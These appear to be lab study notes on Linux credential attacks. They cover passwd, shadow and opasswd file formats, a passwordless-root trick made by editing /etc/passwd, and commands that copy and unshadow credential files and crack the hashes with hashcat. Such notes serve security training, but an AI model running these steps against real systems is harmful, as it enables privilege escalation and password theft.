## Passwd File
#### Passwd Format

|`cry0l1t3`|`:`|`x`|`:`|`1000`|`:`|`1000`|`:`|`cry0l1t3,,,`|`:`|`/home/cry0l1t3`|`:`|`/bin/bash`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Login name||Password info||UID||GUID||Full name/comments||Home directory||Shell|
#### Editing /etc/passwd - Before

```bash
root:x:0:0:root:/root:/bin/bash
```
#### Editing /etc/passwd - After

```bash
root::0:0:root:/root:/bin/bash
```
#### Root without Password

```bash
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash


[cry0l1t3@parrot]─[~]$ su

[root@parrot]─[/home/cry0l1t3]#
```
## Shadow File
#### Shadow Format

| `cry0l1t3` | `:` | `$6$wBRzy$...SNIP...x9cDWUxW1` | `:` | `18937`        | `:` | `0`         | `:` | `99999`     | `:` | `7`            | `:`               | `:`             | `:`    |
| ---------- | --- | ------------------------------ | --- | -------------- | --- | ----------- | --- | ----------- | --- | -------------- | ----------------- | --------------- | ------ |
| Username   |     | Encrypted password             |     | Last PW change |     | Min. PW age |     | Max. PW age |     | Warning period | Inactivity period | Expiration date | Unused |
#### Shadow File

```bash
[cry0l1t3@parrot]─[~]$ sudo cat /etc/shadow

root:*:18747:0:99999:7:::
sys:!:18747:0:99999:7:::
...SNIP...
cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
```

- `$<type>$<salt>$<hashed>`
#### Algorithm Types

- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512
## Opasswd

The PAM library (`pam_unix.so`) can prevent reusing old passwords. The file where old passwords are stored is the `/etc/security/opasswd`.
#### Reading /etc/security/opasswd

```bash
Yashfren@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```
## Cracking Linux Credentials
#### Unshadow

```bash
Yashfren@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
Yashfren@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
Yashfren@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
#### Hashcat - Cracking Unshadowed Hashes

```bash
Yashfren@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
#### Hashcat - Cracking MD5 Hashes

```bash
Yashfren@htb[/htb]$ cat md5-hashes.list

qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
```

```bash
Yashfren@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Opasswd #Passwd #Shadow